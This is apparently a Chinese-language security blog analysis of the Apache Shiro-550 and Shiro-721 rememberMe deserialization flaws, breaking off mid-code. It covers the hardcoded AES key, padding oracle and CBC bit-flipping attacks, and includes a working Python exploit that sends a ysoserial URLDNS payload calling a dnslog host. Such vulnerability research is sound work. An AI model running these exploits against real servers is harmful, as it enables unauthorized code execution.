src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910134817070.png" alt="image-20210910134817070"></p><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>把断点下在<code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code>，debug模式启动tomcat容器，<code>root-secret</code> ，勾选<code>Remember Me</code>选项，来到：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909194933883.png" alt="image-20210909194933883"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195047274.png" alt="image-20210909195047274"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195201209.png" alt="image-20210909195201209"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195303738.png" alt="image-20210909195303738"></p><p>来到这里，我们跟进<code>entrypt</code>方法：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195446227.png" alt="image-20210909195446227"></p><p>cipherService具体如下：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195621660.png" alt="image-20210909195621660"></p><p><code>getEncryptionCipherKey</code>具体是干嘛的呢：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195759875.png" alt="image-20210909195759875"></p><p>返回硬编码的key：<code>kPH+bIxk5D2deZiIxcaaaA==</code></p><p>继续跟，直到结束前面所有的操作；</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195948967.png" alt="image-20210909195948967"></p><p>进入<code>rememberSerializedIdentity</code>函数：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909200116535.png" alt="image-20210909200116535"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909202655028.png" alt="image-20210909202655028"></p><p>总结流程：</p><ol><li>用户名序列化</li><li>AES-CBC加密，key已知为<code>kPH+bIxk5D2deZiIxcaaaA==</code></li><li>Base64编码</li><li>将上述设置到cookie中的rememberme字段</li></ol><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>断点打到<code>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</code>：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909201145351.png" alt="image-20210909201145351"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909201335495.png" alt="image-20210909201335495"></p><p>两个重点：</p><p>1- 跟进<code>getRememberedPrincipals</code>函数：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909201721909.png" alt="image-20210909201721909"></p><p>base64为rememberMe字段的value，需要先进行base64解码，返回解密内容</p><p>2- 跟进<code>convertBytesToPrincipals</code>函数，参数bytes存放的是base64解密内容</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909223451788.png" alt="image-20210909223451788"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909223605212.png" alt="image-20210909223605212"></p><p>可以看到先AES解密，再反序列化</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909223655061.png" alt="image-20210909223655061"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909223726963.png" alt="image-20210909223726963"></p><p>解密过程总结：</p><ol><li>读取cookie中的rememberMe字段的值</li><li>Base64解码</li><li>AES解密 Key已知</li><li>反序列化得到用户名</li></ol><h3 id="调试小记"><a href="#调试小记" class="headerlink" title="调试小记"></a>调试小记</h3><p>火狐+burpsuite</p><ol><li>启动tomcat</li></ol><p>第一次登陆注册，钩上rememberMe，之后正常登陆，抓包留存：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909230030693.png" alt></p><ol start="2"><li>在解密这里下断点，在登录状态下，删除JSESSIONID字段，发送第一步保存的数据包，</li></ol><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909230120134.png" alt="image-20210909230120134"></p><ol start="3"><li>触发断点，可以继续跟解密步骤了</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里结合URLDNS打一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">"http://127.0.0.1:8081/samples_web_war_exploded/"</span></span><br><span class="line">jar_file = <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">cipher_key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 rememberme的值</span></span><br><span class="line">popen = subprocess.Popen([<span class="string">'java'</span>,<span class="string">'-jar'</span>, jar_file, <span class="string">"URLDNS"</span>, <span class="string">"http://mfn1qr.dnslog.cn"</span>],</span><br><span class="line"> stdout=subprocess.PIPE)</span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line">encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)</span><br><span class="line">file_body = pad(popen.stdout.read())</span><br><span class="line">base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送get请求</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>:base64_ciphertext.decode()&#125;, timeout=<span class="number">10</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">traceback.print_exc()</span><br></pre></td></tr></table></figure><h1 id="Shiro-721"><a href="#Shiro-721" class="headerlink" title="Shiro-721"></a>Shiro-721</h1><p>用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段</p><p>影响版本：Apache Shiro &lt; 1.4.2版本</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="AES加密模式"><a href="#AES加密模式" class="headerlink" title="AES加密模式"></a>AES加密模式</h3><ul><li><p>AES是一种对称加密的分组加密算法。</p></li><li><p>分组长度固定为128bit</p></li><li><p>密钥长度可变，128bit、192bit、256bit</p></li><li><p>AES应密钥长度可以称为AES-128，AES-192，AES-256</p></li></ul><table><thead><tr><th>AES加密标准</th><th>密钥长度</th><th>分组长度</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>128 bits ( 4 Bytes × 32 bits/Bytes )</td><td>128 bits</td><td>10</td></tr><tr><td>AES-192</td><td>192 bits ( 6 Bytes × 32 bits/Bytes )</td><td>128 bits</td><td>12</td></tr><tr><td>AES-256</td><td>256 bits ( 8 Bytes × 32 bits/Bytes )</td><td>128 bits</td><td>14</td></tr></tbody></table><h3 id="分组模式"><a href="#分组模式" class="headerlink" title="分组模式"></a>分组模式</h3><p>分组加密有 5 种可选方式：</p><ul><li><strong><code>ECS</code> ( Electronic Codebook Book , 电话本模式 )</strong></li><li><strong><code>CBC</code> ( Cipher Block Chaining , 密码分组链接模式 )</strong></li><li><strong><code>CTR</code> ( Counter , 计算器模式 )</strong></li><li><strong><code>CFB</code> ( Cipher FeedBack , 密码反馈模式 )</strong></li><li><strong><code>OFB</code> ( Output FeedBack , 输出反馈模式 )</strong></li></ul><h3 id="CBC-模式"><a href="#CBC-模式" class="headerlink" title="CBC 模式"></a>CBC 模式</h3><p>CBC模式作为分组加密的一种，加解密方法如图：</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018110917843.png" alt="image-20211018110917843"><p>加密过程中，</p><p>IV(Initialization Vector)表示起始向量，通常是随机生成的，长度同分组大小相同，同明文一起传输。</p><p>padding：表示填充位，凑成长度为分组的整数倍</p><p>第一个明文块首先会和IV进行异或操作，再执行AES加密，得到第一密文块。</p><p>之后，每个明文块会与前一个密文块进行异或，再进行加密。</p><p>最终的密文长度就是图中所有ciphertext块的拼接长度</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018110517102.png" alt="image-20211018110517102" style="zoom:50%;"><p>解密过程中，</p><p>首先密文按照分组长度进行分组，</p><p>第一个密文块直接进行AES解密，得到middletext，该结果再与IV进行异或，得到第一明文块</p><p>之后每一个AES的解密出来的middletext都会和前一个密文块进行异或，得到对应的明文块。</p><p>明文块再拼接到一起就是解密出来的明文</p><h3 id="Padding-填充模式"><a href="#Padding-填充模式" class="headerlink" title="Padding 填充模式"></a>Padding 填充模式</h3><p>Padding是在加密过程中，在最后一个分组的结尾进行填充，用于补齐。</p><p>AES-CBC模式下的三种Padding方式：</p><ul><li>NoPadding : 明文长度必须是 16 Bytes 的倍数。</li><li>PKCS5Padding : 以完整字节填充 , 每个填充字节的值是用于填充的字节数 。即要填充 N 个字节 , 每个字节都为 N。</li><li>ISO10126Padding : 以随机字节填充 , 最后一个字节为填充字节的个数 。</li></ul><p>Shiro用的是PKCS5Padding：</p><p>正确的padding byte值只可能为：</p><ul><li>1个字节的padding为0x01</li><li>2个字节的padding为0x02,0x02</li><li>3个字节的padding为0x03,0x03,0x03</li><li>4个字节的padding为0x04,0x04,0x04,0x04</li><li>…</li></ul><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211021095129395.png" alt="image-20211021095129395" style="zoom:50%;"><p>值得一提的是，当待加密的数据长度刚好满足分组长度的倍数时，仍然需要填充一个分组长度。</p><h3 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h3><p>Padding Oracle Attack 是一种针对CBC模式分组加密算法的攻击，知道padding model，解密获得明文。</p><p>要成功进行Padding Oracle Attack是需要服务端返回两个不同的响应特征来进行Bool判断的。</p><p>在Apache Shiro的场景中，这个服务端的两个不同的响应特征为：</p><ul><li>Padding Oracle错误时，服务端响应报文的Set-Cookie头字段返回<code>rememberMe=deleteMe</code>；</li><li>Padding Oracle正确时，服务端返回正常的响应报文内容；</li></ul><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018141105917.png" alt="image-20211018141105917" style="zoom:50%;"><h4 id="解密：破解明文"><a href="#解密：破解明文" class="headerlink" title="解密：破解明文"></a>解密：破解明文</h4><p><strong>大前提：</strong></p><p><strong>1. 服务器会对解密结果进行padding校验，给出响应，再判断解密结果的正确性。</strong></p><p><strong>2. 攻击者知道全部密文以及初始向量IV</strong></p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018110517102.png" alt="image-20211018110517102" style="zoom:50%;"><p>当解密时，<strong>最后一组的middle是固定的，倒数第二组的密文和最后一组的middle异或的结果一定是满足padding模式的。</strong></p><p>合格的明文padding只有8种case，这是可以穷举的。</p><p>这时我们需要一个二元组，第一组tmp_IV全是0，第二个为当前组的密文C[n]。</p><p>开始爆破：</p><ol><li><p>尝试让这组plaintext的最后一个字节为0x01，tmp_IV的最后一个字节在0x00~0xff 范围内开始穷举，去与middle整体异或，直到异或结果的最后一位为0x01，假设此时tmp_IV最后一个字节的结果为0x42。</p><p>我们可以通过它得到实际middle的最后一个字节的内容为0x42 XOR 0x01 = 0x43。</p><p>之后让plaintext的最后两个字节为0x0202，最后三个字节为0x030303，最后四个字节为0x040404…，最后8个字节为0x0808080808080808。</p><p>此时就获得了最后一组密文的middle。</p></li><li><p>把最后一组密文的middle与倒数第二组密文进行XOR，便可得到最后一组的明文。</p></li><li><p>舍弃掉最后一组密文，向服务器提交第一组～倒数第二组密文，迭代1、2操作，获得倒数第二组明文。依次规律，直到获得所有分组的明文</p></li><li><p>将明文拼接到一起就是解密结果</p></li></ol><p>因此，通过Padding Oracle Attack可以在不知道key的情况下，获取全部明文的值。</p><h4 id="加密：篡改明文"><a href="#加密：篡改明文" class="headerlink" title="加密：篡改明文"></a>加密：篡改明文</h4><p>在我们获得每一组的middle之后，攻击者可以通过<strong>控制IV，使密文解密为任意明文</strong>。</p><p>参考<a href="https://f1sh.site/2017/08/04/%E5%88%9D%E5%AD%A6padding-oracle-attack/" target="_blank" rel="noopener">f1sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原明文^原IV = middle</span><br><span class="line">新明文^新IV = middle</span><br><span class="line">原明文^原IV^新明文 = 新IV</span><br></pre></td></tr></table></figure><p>简单来说，如果我们可以控制IV，将<code>IV = 原明文^原IV^新明文</code>，将新的IV提交，服务器解密就可以得到我们想要的明文。</p><p>做法：</p><p>原明文的AES加密结果为C[0]-C[N]，我们想要的明文为P[0]-P[N]</p><p>我们只需要C[N]即可，只要C[N]不变，M[N]就不变</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">全0+C[N]爆破，得到M[N]</span><br><span class="line">M[N] XOR P[N] = IV[N] # 这里的IV[N]表示的是参与C[N]这轮的iv</span><br><span class="line">IV[N] = C[N-1] # IV就是前一轮的密文</span><br><span class="line">---</span><br><span class="line">全0+C[N-1]爆破，得到M[N-1]</span><br><span class="line">M[N-1] XOR P[N-1] = IV[N-1]</span><br><span class="line">IV[N-1] = C[N-2] </span><br><span class="line">...</span><br><span class="line">---</span><br><span class="line">全0+C[0]爆破，得到M[0]</span><br><span class="line">M[0] XOR P[0] = IV # 起始IV</span><br><span class="line"></span><br><span class="line">IV+C 拼接一下就可以获得我们定制化的密文了</span><br><span class="line">这串密文发送给服务器，服务器就会帮助我们解密为我们想要的明文了</span><br></pre></td></tr></table></figure><h3 id="CBC翻转攻击"><a href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h3><p>一句话，通过修改密文进而篡改明文。</p><p>第N组明文=第N组密文的解密结果 XOR  第N-1组密文</p><p>公式表达</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Plaintext[0] = Decrypt(Cipher[0]) XOR IV (N=0)</span><br><span class="line">Plaintext[N] = Decrypt(Cipher[N]) XOR Cipher[N-1] (N&gt;=1)</span><br></pre></td></tr></table></figure><p>N&gt;=1下我们假设：</p><p>M = Decrypt(Cipher[N])</p><p>C = Cipher[N-1]</p><p>P = Plaintext[N]</p><p>根据异或特性有，两个数相同为0，不同为1：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">M XOR C = P</span><br><span class="line">M XOR C XOR P = 0</span><br><span class="line">M XOR C XOR P XOR X = X</span><br><span class="line"></span><br><span class="line">最后一组的M是不变的，会一直传递到第一组</span><br><span class="line">C=V 好理解一点</span><br><span class="line">M XOR V = P</span><br><span class="line">M XOR V' = P'</span><br><span class="line"></span><br><span class="line">可得：</span><br><span class="line">V XOR P = V' XOR P'</span><br><span class="line">V' = V XOR P XOR P'</span><br></pre></td></tr></table></figure><p>举个例子:</p><p>cipher = “0123456789,helloworld,java”</p><p>将通过CBC攻击密文篡改明文为”0123456789,helloworld,javA”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex,a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(iv,plaintext)</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(plaintext)%<span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"plaintext length is invalid"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> len(iv) != <span class="number">16</span>:</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"IV length is invalid"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">key=<span class="string">"1234abcd1234abcd"</span></span><br><span class="line">aes_encrypt = AES.new(key,AES.MODE_CBC,IV=iv)</span><br><span class="line"><span class="keyword">return</span> b2a_hex(aes_encrypt.encrypt(plaintext))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(iv,cipher)</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(iv) != <span class="number">16</span>:</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"IV length is invalid"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">key=<span class="string">"1234abcd1234abcd"</span></span><br><span class="line">aes_decrypt = AES.new(key,AES.MODE_CBC,IV=iv)</span><br><span class="line"><span class="keyword">return</span> b2a_hex(aes_decrypt.decrypt(a2b_hex(cipher)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">iv=<span class="string">"ABCDEFGH12345678"</span></span><br><span class="line">plaintext=<span class="string">"0123456789ABCDEFGHhelloworldjava"</span></span><br><span class="line">cipher=encrypt(iv, plaintext) <span class="comment"># 密文</span></span><br><span class="line"><span class="keyword">print</span> (cipher)</span><br><span class="line">de_cipher = decrypt(iv, cipher) <span class="comment"># 明文</span></span><br><span class="line"><span class="keyword">print</span> (de_cipher)</span><br><span class="line"><span class="keyword">print</span> (a2b_hex(de_cipher))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改java-&gt;javA 但是第一个分组乱码</span></span><br><span class="line">bin_cipher = bytearray(a2b_hex(cipher))</span><br><span class="line">bin_cipher[<span class="number">15</span>] = bin_cipher[<span class="number">15</span>] ^ ord(<span class="string">'a'</span>) ^ ord(<span class="string">'A'</span>)</span><br><span class="line">de_cipher = decrypt(iv,b2a_hex(bin_cipher))</span><br><span class="line"><span class="keyword">print</span> (de_cipher)</span><br><span class="line"><span class="keyword">print</span> (a2b_hex(de_cipher))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改IV 不让第一个分组乱码，统一为X</span></span><br><span class="line">bin_decipher = bytearray(a2b_hex(de_cipher))</span><br><span class="line">bin_iv = bytearray(iv.encode())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(iv)):</span><br><span class="line">bin_iv[i] = bin_iv[i] ^ bin_decipher[i] ^ ord(<span class="string">'X'</span>)</span><br><span class="line">print(bin_iv)</span><br><span class="line">de_cipher = decrypt(bytes(bin_iv),b2a_hex(bin_cipher))</span><br><span class="line"><span class="keyword">print</span> (de_cipher)</span><br><span class="line"><span class="keyword">print</span> (a2b_hex(de_cipher))</span><br><span class="line"></span><br><span class="line">test()</span><br></pre></td></tr></table></figure><h2 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h2><p>和550一样，debug启动起来，把断点下到org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals的convertBytesToPrincipals处，持续跟进：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018171112020.png" alt="image-20211018171112020"></p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018173132892.png" alt="image-20211018173132892" style="zoom:50%;"><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018191828795.png" alt="image-20211018191828795" style="zoom:50%;"><p>接下来进入</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018191909091.png" alt="image-20211018191909091" style="zoom:50%;"><p>做了一系列处理</p><h4 id><a href="#" class="headerlink" title></a><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193429360.png" alt="image-20211018193429360"></h4><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193508168.png" alt="image-20211018193508168" style="zoom:50%;"><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193555759.png" alt="image-20211018193555759" style="zoom:50%;"><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193614757.png" alt="image-20211018193614757" style="zoom:50%;"><p>进入doFinal函数</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193745018.png" alt="image-20211018193745018" style="zoom:50%;"><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193721060.png" alt="image-20211018193721060" style="zoom:50%;"><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193841499.png" alt="image-20211018193841499" style="zoom:50%;"><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193918762.png" alt="image-20211018193918762"></p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018194008372.png" alt="image-20211018194008372" style="zoom:50%;"><p>调用链：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.crypto.Cipher#doFinal(byte[])</span><br><span class="line">com.sun.crypto.provider.AESCipher#engineDoFinal(byte[], int, int)</span><br><span class="line">com.sun.crypto.provider.CipherCore#doFinal(byte[], int, int)</span><br><span class="line">com.sun.crypto.provider.CipherCore#fillOutputBuffer</span><br><span class="line">com.sun.crypto.provider.CipherCore#unpad</span><br><span class="line">com.sun.crypto.provider.PKCS5Padding#unpad</span><br></pre></td></tr></table></figure><p>可以看到了来到了Shiro选择的PKCS5Padding类unpad函数：</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018194444766.png" alt="image-20211018194444766" style="zoom:50%;"><p>这里如果unpad报错，会爆异常<code>new CryptoException(msg, e);</code></p><p>回到上层可以看到，由<code>onRememberedPrincipalFailure</code>函数来处理</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018195432687.png" alt="image-20211018195432687" style="zoom:50%;"><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018195807299.png" alt="image-20211018195807299" style="zoom:50%;"><p>只要padding错误，服务端就会返回一个cookie: <strong>rememberMe=deleteMe;</strong></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="前提1-攻击者拥有正常用户的rememberMe字段"><a href="#前提1-攻击者拥有正常用户的rememberMe字段" class="headerlink" title="前提1: 攻击者拥有正常用户的rememberMe字段"></a>前提1: 攻击者拥有正常用户的rememberMe字段</h3><p>shiro的rememberMe中存放的是：前16字节为IV，后面为AES加密之后的密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_encrypted_text</span><span class="params">(RememberMe_cookie)</span>:</span></span><br><span class="line"><span class="keyword">return</span> base64.b64decode(RememberMe_cookie)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(encrypted_text)</span>:</span></span><br><span class="line">key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">IV  = encrypted_text[:<span class="number">16</span>]</span><br><span class="line">remember_bin = AES.new(base64.b64decode(key), AES.MODE_CBC, IV=IV).decrypt(encrypted_text[<span 